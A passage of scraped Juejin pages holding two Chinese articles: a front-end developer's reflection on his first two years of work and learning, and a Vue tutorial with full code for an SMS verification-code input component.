是一个翻译优质互联网技术文章的社区，文章来源为 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im\" rel=\"nofollow noopener noreferrer\">掘金</a> 上的英文分享文章。内容覆盖 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23android\" rel=\"nofollow noopener noreferrer\">Android</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23ios\" rel=\"nofollow noopener noreferrer\">iOS</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E5%2589%258D%25E7%25AB%25AF\" rel=\"nofollow noopener noreferrer\">前端</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E5%2590%258E%25E7%25AB%25AF\" rel=\"nofollow noopener noreferrer\">后端</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E5%258C%25BA%25E5%259D%2597%25E9%2593%25BE\" rel=\"nofollow noopener noreferrer\">区块链</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E4%25BA%25A7%25E5%2593%2581\" rel=\"nofollow noopener noreferrer\">产品</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E8%25AE%25BE%25E8%25AE%25A1\" rel=\"nofollow noopener noreferrer\">设计</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner%23%25E4%25BA%25BA%25E5%25B7%25A5%25E6%2599%25BA%25E8%2583%25BD\" rel=\"nofollow noopener noreferrer\">人工智能</a>等领域，想要查看更多优质译文请持续关注 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fxitu%2Fgold-miner\" rel=\"nofollow noopener noreferrer\">掘金翻译计划</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fweibo.com%2Fjuejinfanyi\" rel=\"nofollow noopener noreferrer\">官方微博</a>、<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fjuejinfanyi\" rel=\"nofollow noopener noreferrer\">知乎专栏</a>。</p>\n</blockquote>\n</div>"},null,{"title":"前端入行两年--教会了我这些道理","avatar":"https://user-gold-cdn.xitu.io/2017/7/18/64d82b70650d11ed806f611d929c7b1e?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"守候i","create_time":"2017 年 12 月 18 日","tags":["JavaScript","前端"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 data-id=\"heading-0\">1.前言</h2><p>光阴似箭，日月如梭。不得不感慨时间过得很快，2017差不多结束了，一下子我从事前端开发的时间已经两年了。这两年可以说是一波三折，回想这两年的经历，让我忍不住了写下了这篇文章，记录自己在这两年经历的种种种种。这篇文章，打算当做自己的一个经历记录，而对于看这篇文章的你，希望你们能从我的经历里面吸取教训，希望即将步入前端和已经从事前端的你，不要想我这样一波三折，在前端的路走得更好。</p><h2 data-id=\"heading-1\">2.大学时光</h2><p>考完了第二次高考，紧跟着就是懵懵懂懂的上了大学，报的专业就是‘软件技术(网站设计)’。这么说，我也算是科班出身了，只是大学不是那么出名而已！在大学的时光里面，我并不是每天埋头在电脑前面写代码，学习。生活上有社团，班级的活动我基本都参加，也经常约上同学打篮球，聚餐，外出。这些经历，对于大学而言，是非常珍贵的经历，我想拥有多一些这样的经历。至于学习上，我也努力过，也有懒散过。成就方面，除去一些平常的奖项，比较有成就感的就是班里的成绩和个人素质综合测评我都是第一，因此一等奖学金和国家励志奖学金我没落下过。虽然这些和同级的人参加了什么国家省市的比赛，获得了多少等奖，多少名无法相提并论，但是我不求与他人相比，只求超越自己。在步入大学的第一天，我就想不虚度大学的时光，学好专业的知识，不再因自己的不努力而后悔。这个我算是做到了，只是不完美。至于不完美的原因，主要有两个：</p><p>一是自己的坚持和自制力不够，主要表现在两个方面——自己本身打算做一个项目练手，后来就是因为懒散或者技术难题放弃了。还有就是和在图书馆借了书，根本没怎么看，等于拿回宿舍放两三个月再还给图书馆！</p><p><b>无论是否是大学生，无论有老师与否，学习这个都是靠自己的努力，靠自己的坚持，坚持，再坚持</b></p><p>二是自己在大学的学习里面，我虽然成绩很好，但不代表技术好，因为和同学对比，我的技术差了可不止一两条街。因为在学习上，我最多也是跟着老师和课本上面的内容学习，不了解外面的世界，不知道技术趋势，也没有和行业的人交流过。这也导致我在实习的时候很是吃亏！</p><p><b>大学的知识需要学习，但是外面的技术趋势也得了解。反复折腾大学的项目，功课。学到的知识比较有限。对外面的技术趋势有有了解，加入社区和行业的人交流，学到的会更多，学习效率也更高。</b></p><h2 data-id=\"heading-2\">3.初入前端</h2><p>大学的两年时间感觉一晃就过了，一下就到了大三，出来实习了。在接触前端之前，我写了三个月的php，后来发现自己对前端更有兴趣，所以转前端了。但是这条路并不平坦，因为我找了半个月的的工作，面试了16家公司，15家拒绝，最后一家录用我了，就在两年前的11月，我有了第一份前端的工作。当时听到录用了，想都没想，立马就去入职了，没有上网或者去群聊消息打听过这个公司，对立面的情况一概的不了解。带着兴奋的心理去入职了，一个星期之后，我就在想着什么时候离职了。因为公司虽然是有400人，前端也有50人，但是基本（95%）都是实习生或者应届生，做的东西都是切图(html+css,js基本不需要写)即使是技术经理，当时觉得他技术厉害，现在觉得技术很水。做的项目都是很粗糙的（几千块一个项目，设计+前端+后台，大家可以想下是什么样的项目了），工资基本就是1600-2000，涨薪最多也就2500，每天加班也拼不上3000，在那工作四五年最多4000，福利补贴什么也没有，反倒是扣钱的借口就一大堆。每天开会进行‘洗脑’活动，平均每天入职一人，离职一人，入职没满一年就离职还要扣15个工作日的工资等等等等。公司名称不说了，毕竟当时入职都是你情我愿的事情，只是当时自己太天真而已。</p><p><b>可能是因为我的专业技能学得并不是很好，这个经历现在还历历在目，在从那一次开始，我找工作再也不敢着急了，因为越是着急，越是找不到合适的工作。现在面试的时候我也会多问几句，公司的规章制度，福利补贴，薪资待遇，工作内容等问题，入职之前也多了解下公司，上网看评价（如果是初创的公司，网上没有评价的就爱莫能助了）。</b></p><p>前端的第一份工作是不如意，但不代表我就自暴自弃，在工作之余，我也有抓紧学习！这几个月我先是看了blue（智能社的创始人）的入门视频，后来又看了红皮书（【javascript高级程序设计】）。我看视频或者看书的时候，我并没有太着急，要逼自己太紧，而是紧盯的自己要劳逸结合，不能懒散。三个月后，视频和红皮书看完了，前端的三大基础，html+css+js有了一个最基本的认识，并不是很牢固的那一种，即使是切图，也是有点粗糙。看完了视频和红皮书的半个月后，我实在是不想再拖了，拿了2月份的工资的当天，就提离职了。当时主管跟我说，我入职没满一年就离职，是要扣15个工作日的工资的，这个月至少要做够15个工作日，我当时并没有理会，直接第二天不来了，合同没签，我走你也没办法！</p><p><b>遇到实在是受不了的公司，不建议在纠缠下去，早点一刀两断或者就是最好的一个决定。当时在这家公司，有些人觉得被扣15个工作日的工资不划算，打算做满一年再离职。我就直接放弃，频繁请假或者上班不做事，自己学习。他不仁我不义，所以三月份免费给他打工的工作日并没有多少。对于这一次离职3月份的几天工资，我也不那么在乎，第一没多少，第二在乎可能会失去更多，代价更大！</b></p><p><b>虽然工作的前三年我看重的是收获，待遇次之。如果收获基本没有，待遇也不行，我找不到理由留下，别人也无法说服我留下！</b></p><h2 data-id=\"heading-3\">4.播种之路</h2><p>上一份工作离职了之后，好像面试了5家公司吧，最终入职了一家初创公司，这家公司当时不到10个员工。基本都是技术开发，但是前端只有我一个。所以在这家公司，所有的前端只能靠我自己了，不懂的上网搜，或者在Q群问人。在这家公司里工作，比第一份工作好了很多，很多。但是做的事情，也可以说是比较机械，就是切图，只是比第一份工作复杂了些，也需要写交互特效，因此我的javascript和jquery练得比较多，用起来也顺手了很多。</p><p>自己也是在一些前端群里面也是比较活跃了，经常和一些人交流，也会上github看别人的代码！这份工作的前半年，我主要活跃于Q群，但是和那些人聊天，闲聊比较多，代码基本没怎么聊过，有时候也会交流下意见，这些都让我获益匪浅，改变了我很多的认知和做事方式。其中最简单粗暴的一个场景就是：我遇到不懂的，去群上提问，有人回答说：“网上一大堆答案，还来问！”，“看文档啊，写得那么详细！”。正因为被别人说得多了，我遇到问题不再是不懂马上问，而是不懂的先思考，再上网搜，看下有没有类似的答案或者教程，实在是搞不定的再去群里问。在这里也很感谢那些耐心帮我解决难题的大牛，也感谢他们的指导。有时候遇到自己能解答的，我也会尽力而为，毕竟能帮到别人，对自己也是一种实战。在群里，除了答疑和闲聊，也有交流意见，比较有印象的是这些谈话：“我一个星期看完【javascript高级程序设计】，3天看完【javascript dom编程艺术】”，“我买了犀牛书，目标一个月内看完”。</p><p><b>这些话看着很威风。但我当时在想，这些人把看书当成百米赛跑了，谁看得快谁就厉害？为什么看书要加上期限？在自己规定的期限内看完，里面的知识点能吸收多少呢？</b></p><p>出于这样的心理，我想主要是由两个，一个是为了逼自己学习，避免因为自己懒散而出现有书不看这样的场景。第二个是学习的浮躁心理，看着要学习的这么多，得赶紧看完，再看下一本！</p><p>还有一个就是比较深刻一个聊天内容时：有人说想学javascript，但是不知道看什么书，我就推荐红皮书，但是那个人直接回答：“那本我都看完了！”。</p><p><b>那时候我在想，一本书看完了就不能重复再看，还是说一本书只能看一遍，或者是看完了一本书，书上的知识都学会了，不需要看了？</b></p><p>这份工作的后半年，因为我老是用html+css+javascript+jquery开发项目，以及自己的一些练习。对于群里人说的es6，gulp，webpack，vue，angular，react等这一些完全不懂，甚至根本没听过。那个时候我先是看了阮一峰的【es6标准入门】，学习es6的语法，之后也是对gulp，webpack，angular,vue有了一个最基本的了解，但是还是很懵逼。因为并不是大家所说的前端模块化，工程化。而且这份工作，开发的项目一直用的是html+css+javascript+jquery。没跟上技术的趋势，也使用不了新技术。对自己技术水平，再提升一个等级比较困难，而且待遇方面也没增加，就是在今年年初涨了500。所以，出于对自己成长的考虑，我2月份提出了离职！在3月份正式离职。</p><p>离职的时候，还是挺不舍的，因为和这家公司的同事相处不错，也是激发了我的兴趣。这一份工作，增加了我对前端的兴趣，接触新的技术，也感觉是种下了前端的种子！这也解释了为什么我把第二份工作的经历称为我的‘播种之路’。</p><p><b>这又说到找工作的事情，大家找工作的时候，建议问下面试官，应聘的职位的工作内容主要是的。我所见过的一些情况就是：一些群友去面试前端，虽然是前端开发，但是工作内容是做小程序或者切图。然后就觉得这样的工作很无趣，做了几天就离职。所以大家应聘的时候，多问几句！除了薪资待遇，公司环境。工作内容也很重要！</b></p><h2 data-id=\"heading-4\">5.萌芽之路</h2><p>现在这份工作与之前工作不一样，这份工作是在Q群联系的，之前是在网站投简历的。办完了离职手续过了几天，就进入现在这家公司入职了。刚进来的两天，并没有工作任务，只是老大教我怎么使用node.js搭建开发环境，让我知道什么是前端模块化，前端工程化的便利性。给我演示怎么使用gulp，webpack，vue，sass等配合开发项目，以及开发的一些规范。之后就给了两个页面的练手，给老大过目之后，给了一些要求和建议。因为在离职前，我有了解过node.js，gulp，webpack，vue等，所以熟悉公司的技术栈的过程比较顺利。这份工作也让我有了拥抱流行趋势，主流技术的感觉。</p><p><b>当然了，流行趋势和主流的技术我并不是一股脑的学，而是项目用到什么就学什么，觉得什么有兴趣，有学习的价值学什么。如果什么都一股脑的学，而项目上没用上，没实战过，很快就会忘的。所以我现在就是什么需要学，对什么有兴趣，有什么是很有学习价值的就去学什么。</b></p><p>这份工作的经历，之所以称为‘萌芽之路’：</p><p>一是因为我虽然有了拥抱流行趋势，主流技术的感觉。但是一切我都是新学，还是新手，还是很多需要学习。</p><p>二是因为入职不久，就被老大催着注册一个github，也经同事的分享，知道了很多的学习资源，对自己改变了很多，每天都看一些社区的文章，公众号的文章，从中学习和了解知识和行业趋势。自己也喜欢在社区上写博客。这也是刚开始。</p><p>这个经历，对我的改变，太多太多。改变最大的主要两个方面：<br>1.对于前端开发，现在并不是像以前那样一味的使用html+css+js+jquery，我有和公司的同事持续的努力，关注前端的趋势，探索前端的技术。我也很感谢公司的两个前端对我的耐心指导。<br>2.还有一个方面就是在工作之余的时间，以前我主要是活跃于Q群，现在就算有空余的时间，我也基本没看过Q群，而是自己学习，如果有什么需要分享的，就在社区写文章或者交流！</p><p><b>在工作这一方面，特别是接触前端三年以下的人，有人带和没人带是有区别的！有人指导下，可以少走很多弯路。有时候不知道学什么东西了，也可以给出一些建议。前提是，自己也要努力学习。</b></p><p><b>大家业不要以为有人带就自己就不需要思考了，完全让别人教！因为教的可能不会一字一字的教，可能就是指导一下，别人也要上班，也要做事的，没那么多时间详细教！别人如果教的太详细，对自己而言，未必是好事，因为教的详细，说的就多，记住的就少，思考也少，容易乱，印象就不深刻。所以建议大家，在向别人请教的时候，要做笔记或者在电脑实际操作，加深自己的印象，不然很容易忘记！好记性不如硬笔头！</b></p><h2 data-id=\"heading-5\">6.关于社区</h2><p>在社区混了也有一段时间了，顺便说下自己的感受。9月加入掘金，是我第三个注册账号的社区，是第二个因为想些博客而加入的社区。写文章很辛苦，是一个脑力活和体力活（针对我自己，一般来说我写一篇文章是4小时左右，有几篇文章写了超过10小时），但是值得。因为好处和收获也不少，主要有下面几个：</p>1.加深对技术点的学习和理解，方便对日后的使用。也是思考和总结的一个路径。<br>2.结交更多志同道合的朋友，大家交流意见，互相帮助。<br>3.提高自己的思维能力和写作水平。<br>4.当日志使用，看着自己写过的博客，回想着这个过程，也是一个美好的回忆。<br>5.鞭策自己持续的学习和思考。写博客就是这样神奇，写了第一篇，就是想持续的写下去，要想持续的写下去，自己就必须要持续的学习和思考，否则没内容可写！<br><br><div><p>其它的好处和收获就不多说了！</p><p>虽然我写文章主要是记录，分享，交流意见和认识朋友。但是每一次进入社区的时候，看到自己的文章被喜欢，心里都是挺开心的，因为这也是别人对自己的一种肯定，一种鼓励方式！</p><p>既然这篇文章在掘金发布，说下对掘金的感受（这里偏题了，希望大家不要介意）：</p><p>内容方面，偶尔有听到说掘金的文章内容比以前水了，我加入掘金有三个月，并不知道以前的掘金文章质量是什么的情况，但是现在掘金的文章质量，给我的感觉挺好的，比其他的一些博客社区要好！文章的显示机制我也觉得很好（首页中，不但能看到新发布的文章，热门的文章，也有作者推荐。其他类似的板块也是如此）！这个让我满意。</p><p>用户交流方面，掘金的微信群很多，光是我自己加入的也有几个，群也是比较活跃，在群里，除了能在开发这交流，也能让开发者提供对社区的一个建议！除此之外，掘金也不定时会请一个大牛，进行一个直播分享的教程，干货满满的，很多人都活跃参加！直播结束也会有抽奖</p><p>福利方面，掘金的周边送得比较多，每次的活动直播，基本会有抽奖，会送上周边！</p><p>遗憾的地方在于：</p><p>1.搜索方面，这个。。。个人觉得要优化下吧！</p><p>2.文章方面，觉得还是有一个标签分类会比较好！（html，css，javascript，node.js...）</p><p>3.周边方面，掘金送的周边很多，比我知道的几个社区都多，但是拿掘金的周边，很大一部分是靠运气！即使有的作者在掘金写了很多的文章，被浏览和被喜欢次数也很多，但是运气不好，或者直播活动参加得少，就很难有机会拿周边。虽然大部分作者写文章不是为了拿周边，但是觉得给些周边，多多少少可以起到一个鼓励的作用！每个季度，每半年给社区贡献前10，前15，前20的作者一点周边这个感觉也不算是很过分的事情！（我拿过一些周边，虽然这些周边在价格上面似乎不高，但每次拿到周边我都很珍惜，因为个人觉得这个是一个额外的收获，也是社区对自己的肯定。可能是因为我是一个比较重情的人吧。）</p><h2 data-id=\"heading-6\">7.工作之外</h2><p>大家对程序员的印象可能都是‘宅’，‘内向’，‘闷’，‘游戏狂’等，而且大家看文章，看到这里，大家对我的印象可能也是写代码和学习。其实不然，我有自己的兴趣爱好，而且兴趣爱好还比较广泛，只是每一个爱好都没有太深入，水平就是半桶水而已（此处尴尬10000+）。</p><p><b>工作之余，专业技能之外，有自己的兴趣爱好，做自己喜欢做的事情，可能是最简单的幸福。兴趣爱好和早睡早起，吃好喝好这些习惯一样，都是善待自己的一种方式，也能让自己的生活充满乐趣！</b></p><p>我自已兴趣爱好有：摄影，健身，诗词，篮球，羽毛球，旅游，跑步，做饭，线下交流等！这些兴趣爱好，可能有些因为特别原因我还没行动过，但是未来一定会有行动的。</p><p>附上知乎上程序员的神技能：<br><a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.zhihu.com%2Fquestion%2F67078910\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">程序员除了敲代码，还有哪些隐藏的神技能？</a></p><h2 data-id=\"heading-7\">8.几句鸡汤</h2><p>1.可能很多人像我之前一样，会和别人比较：“同样是一年经验，别人的技术都那么厉害，待遇那么高了！”，“那些人技术水平不如我，但是却找到比我好的工作，有人带，技术也好！”等。对于这些也抱怨过，闷闷不乐过，但是想着我这个样子，除了自己变得颓废之外，改变不了任何情况。也有可能别人的努力我看不到，或者别人的其他方面比我优秀，即使真的只是运气不如别人，那又怎样了！我能做的，只有坚持和努力！现在我的想法是：不求与别人相比，只求超越自己！</p><p>2.我不期待突如其来的运气，只期待我的努力能有所收获。努力未必成功，但是不努力一定失败。即使没有成功，至少我在回想以前的时候，我至少努力过，奋斗过，这就足以无怨无悔。我也相信，以后小有成就的我，一定会感谢现在努力的自己！</p><p>3.换了几次工作，可能在别人眼里，我换工作很频繁，但是在我自己眼里，我觉得是正确的选择。也是这几次换工作，让我体会到，有时候选择比努力更重要。与其在一个没有什么收获的方向努力，不如选择一个更多收获的方向努力。</p><h2 data-id=\"heading-8\">9.未来展望</h2><p>关于未来，在学习方面，不断学习是必须的，但是目标我不立得太明确。因为以往的经验告诉我，前端这一个领域，技术更新的非常的快，计划总是赶不上变化。担无论如何变化，未来我继续展望，继续努力，望自己能在行业立足，更上一层楼。也期待能和大家有更多的交流，更多的学习，更大的进步！</p><p>需要加微信，方便以后交流的，欢迎添加，备注如：前端-广州-昵称或者名字。我也组了个微信群，需要进的跟我说下！</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/18/16067657e9257013?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"200\" data-height=\"200\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/svg&gt;\"></p><p>想了解更多，关注关注我的微信公众号：守候书阁</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/8/160d33b27d3f303a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"258\" data-height=\"258\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;258&quot; height=&quot;258&quot;&gt;&lt;/svg&gt;\"></p><p><br></p></div><p><br></p></div>"},{"title":"使用VUE分分钟写一个验证码输入组件","avatar":"https://user-gold-cdn.xitu.io/2017/7/14/40c12e86dd1df1c433f08d53781bf5ea?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"liusong","create_time":"2017 年 12 月 14 日","tags":["Vue.js"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">效果</h2>\n<p>先来看波完成效果图\n</p><figure><img alt=\"效果图\" class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/14/16053523aafa2d76?imageslim\" data-width=\"692\" data-height=\"994\" src=\"https://user-gold-cdn.xitu.io/2017/12/14/16053523aafa2d76?imageslim\"><figcaption></figcaption></figure><p></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fls1231.github.io%2Fvue-security-code%2F\" rel=\"nofollow noopener noreferrer\">预览地址</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FLS1231%2Fvue-security-code\" rel=\"nofollow noopener noreferrer\">github地址</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fvue-security-code\" rel=\"nofollow noopener noreferrer\">npm地址</a></p>\n<h2 class=\"heading\" data-id=\"heading-1\">需求</h2>\n<p>输入4位或6位短信验证码，输入完成后收起键盘</p>\n<h2 class=\"heading\" data-id=\"heading-2\">实现步骤</h2>\n<h3 class=\"heading\" data-id=\"heading-3\">第一步</h3>\n<p><strong>布局排版</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;div class=<span class=\"hljs-string\">\"security-code-wrap\"</span>&gt;\n    &lt;label <span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"code\"</span>&gt;\n      &lt;ul class=<span class=\"hljs-string\">\"security-code-container\"</span>&gt;\n        &lt;li class=<span class=\"hljs-string\">\"field-wrap\"</span> v-for=<span class=\"hljs-string\">\"(item, index) in number\"</span> :key=<span class=\"hljs-string\">\"index\"</span>&gt;\n          &lt;i class=<span class=\"hljs-string\">\"char-field\"</span>&gt;{{value[index] || placeholder}}&lt;/i&gt;\n        &lt;/li&gt;\n      &lt;/ul&gt;\n    &lt;/label&gt;\n    &lt;input ref=<span class=\"hljs-string\">\"input\"</span> class=<span class=\"hljs-string\">\"input-code\"</span> @keyup=<span class=\"hljs-string\">\"handleInput(<span class=\"hljs-variable\">$event</span>)\"</span> v-model=<span class=\"hljs-string\">\"value\"</span>\n           id=<span class=\"hljs-string\">\"code\"</span> name=<span class=\"hljs-string\">\"code\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"tel\"</span> :maxlength=<span class=\"hljs-string\">\"number\"</span>\n           autocorrect=<span class=\"hljs-string\">\"off\"</span> autocomplete=<span class=\"hljs-string\">\"off\"</span> autocapitalize=<span class=\"hljs-string\">\"off\"</span>&gt;\n&lt;/div&gt;\n</code></pre><ul>\n<li>使用li元素来模拟输入框的显示，没有别的目的，就只是为了语义化，当然你也可以使用其他任意一个元素来模拟，比如div。</li>\n<li>使用label标签的好处在于它可以跟input的click事件关联上，一方面实现了语义化解决方案，另一方面也省去了我们通过js来唤起虚拟键盘。</li>\n</ul>\n<p><strong>隐藏输入框</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\">.input-code {\n    position: absolute;\n    left: -9999px;\n    top: -9999px;\n}\n</code></pre><ul>\n<li>将真实的输入框定位到屏幕可视区域以外的地方，虚拟键盘被唤起时，就不会将页面往上顶了。所以你的验证码输入组件一定要放在虚拟键盘遮挡不了的地方。</li>\n</ul>\n<h3 class=\"heading\" data-id=\"heading-4\">第二步</h3>\n<p><strong>处理验证码输入</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">handleSubmit</span></span> () {\n  this.<span class=\"hljs-variable\">$emit</span>(<span class=\"hljs-string\">'input'</span>, this.value)\n},\nhandleInput (e) {\n  <span class=\"hljs-keyword\">if</span> (e.target.value.length &gt;= this.length) {\n    this.hideKeyboard()\n  }\n  this.handleSubmit()\n}\n</code></pre><ul>\n<li>输入时，给输入框赋一次值，是为了解决android端上输入框失焦后重新聚焦，输入光标会定在第一位的前面，经过赋值再聚焦，光标的位置就会显示在最后一位后面。</li>\n</ul>\n<h3 class=\"heading\" data-id=\"heading-5\">第三步</h3>\n<p><strong>完成输入后关闭虚拟键盘</strong></p>\n<pre><code class=\"hljs bash\" lang=\"bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">hideKeyboard</span></span>() {\n  // 输入完成隐藏键盘\n  document.activeElement.blur() // ios隐藏键盘\n  this.<span class=\"hljs-variable\">$refs</span>.input.blur() // android隐藏键盘\n}\n</code></pre><h2 class=\"heading\" data-id=\"heading-6\">组件完整代码</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;template&gt;\n  &lt;div class=<span class=\"hljs-string\">\"security-code-wrap\"</span>&gt;\n    &lt;label :<span class=\"hljs-keyword\">for</span>=<span class=\"hljs-string\">\"`code-<span class=\"hljs-variable\">${uuid}</span>`\"</span>&gt;\n      &lt;ul :class=<span class=\"hljs-string\">\"`<span class=\"hljs-variable\">${theme}</span>-container security-code-container`\"</span>&gt;\n        &lt;li class=<span class=\"hljs-string\">\"field-wrap\"</span> v-for=<span class=\"hljs-string\">\"(item, index) in length\"</span> :key=<span class=\"hljs-string\">\"index\"</span>&gt;\n          &lt;i class=<span class=\"hljs-string\">\"char-field\"</span>&gt;{{value[index] || placeholder}}&lt;/i&gt;\n        &lt;/li&gt;\n      &lt;/ul&gt;\n    &lt;/label&gt;\n    &lt;input ref=<span class=\"hljs-string\">\"input\"</span> class=<span class=\"hljs-string\">\"input-code\"</span> @keyup=<span class=\"hljs-string\">\"handleInput(<span class=\"hljs-variable\">$event</span>)\"</span> v-model=<span class=\"hljs-string\">\"value\"</span>\n           :id=<span class=\"hljs-string\">\"`code-<span class=\"hljs-variable\">${uuid}</span>`\"</span> :name=<span class=\"hljs-string\">\"`code-<span class=\"hljs-variable\">${uuid}</span>`\"</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"tel\"</span> :maxlength=<span class=\"hljs-string\">\"length\"</span>\n           autocorrect=<span class=\"hljs-string\">\"off\"</span> autocomplete=<span class=\"hljs-string\">\"off\"</span> autocapitalize=<span class=\"hljs-string\">\"off\"</span>&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n  <span class=\"hljs-built_in\">export</span> default {\n    name: <span class=\"hljs-string\">'SecurityCode'</span>,\n    // component properties\n    props: {\n      length: {\n        <span class=\"hljs-built_in\">type</span>: Number,\n        default: 4\n      },\n      placeholder: {\n        <span class=\"hljs-built_in\">type</span>: String,\n        default: <span class=\"hljs-string\">'-'</span>\n      },\n      theme: {\n        <span class=\"hljs-built_in\">type</span>: String,\n        default: <span class=\"hljs-string\">'block'</span>\n      }\n    },\n    // variables\n    <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span> () {\n      <span class=\"hljs-built_in\">return</span> {\n        value: <span class=\"hljs-string\">''</span>\n      }\n    },\n    computed: {\n      <span class=\"hljs-function\"><span class=\"hljs-title\">uuid</span></span> () {\n        <span class=\"hljs-built_in\">return</span> Math.random().toString(36).substring(3, 8)\n      }\n    },\n    methods: {\n      <span class=\"hljs-function\"><span class=\"hljs-title\">hideKeyboard</span></span> () {\n        // 输入完成隐藏键盘\n        document.activeElement.blur() // ios隐藏键盘\n        this.<span class=\"hljs-variable\">$refs</span>.input.blur() // android隐藏键盘\n      },\n      <span class=\"hljs-function\"><span class=\"hljs-title\">handleSubmit</span></span> () {\n        this.<span class=\"hljs-variable\">$emit</span>(<span class=\"hljs-string\">'input'</span>, this.value)\n      },\n      handleInput (e) {\n        <span class=\"hljs-keyword\">if</span> (e.target.value.length &gt;= this.length) {\n          this.hideKeyboard()\n        }\n        this.handleSubmit()\n      }\n    }\n  }\n&lt;/script&gt;\n\n&lt;style scoped lang=<span class=\"hljs-string\">\"less\"</span>&gt;\n  .security-code-wrap {\n    display: flex;\n    align-items: center;\n    justify-content: center;\n  }\n\n  .security-code-container {\n    margin: 0;\n    padding: 0;\n    display: flex;\n    .field-wrap {\n      list-style: none;\n      display: block;\n      height: 40px;\n      width: 40px;\n      line-height: 40px;\n      font-size: 16px;\n      .char-field {\n        font-style: normal;\n      }\n    }\n  }\n\n  .block-container {\n    justify-content: center;\n    .field-wrap {\n      background-color: <span class=\"hljs-comment\">#fff;</span>\n      margin: 2px;\n      color: <span class=\"hljs-comment\">#000;</span>\n    }\n  }\n\n  .line-container {\n    position: relative;\n    background-color: <span class=\"hljs-comment\">#fff;</span>\n    &amp;:after {\n      box-sizing: border-box;\n      content: <span class=\"hljs-string\">\"\"</span>;\n      width: 200%;\n      height: 200%;\n      transform: scale(.5);\n      position: absolute;\n      border: 1px solid <span class=\"hljs-comment\">#d9d9d9;</span>\n      top: 0;\n      left: 0;\n      transform-origin: 0 0;\n      border-radius: 4px;\n    }\n    .field-wrap {\n      flex: 1;\n      position: relative;\n      &amp;:not(:last-child):after {\n        content: <span class=\"hljs-string\">\"\"</span>;\n        width: 1px;\n        height: 50%;\n        position: absolute;\n        right: 0;\n        top: 25%;\n        background-color: <span class=\"hljs-comment\">#d9d9d9;</span>\n        transform: scaleX(.5);\n      }\n    }\n  }\n\n  .input-code {\n    position: absolute;\n    left: -9999px;\n    top: -9999px;\n  }\n\n&lt;/style&gt;\n\n</code></pre><h2 class=\"heading\" data-id=\"heading-7\">组件使用代码</h2>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;security-code v-model=<span class=\"hljs-string\">\"code\"</span>&gt;&lt;/security-code&gt;\n</code></pre><h2 class=\"heading\" data-id=\"heading-8\">结束语</h2>\n<p>怎么样，484 so easy</p>\n<p>一开始的思路也是4个输入框，监听输入完成跳到下一个输入框，这样的做法也能达到目的，不过需要更多的代码去维护这个规则，不够优雅。</p>\n<p>目前的做法已经是我能想到最优的解决方案，如果你有更好的实现思路，还望不吝赐教。</p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fls1231.github.io%2Fvue-security-code%2F\" rel=\"nofollow noopener noreferrer\">预览地址</a></p>\n<p><a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FLS1231%2Fvue-security-code\" rel=\"nofollow noopener 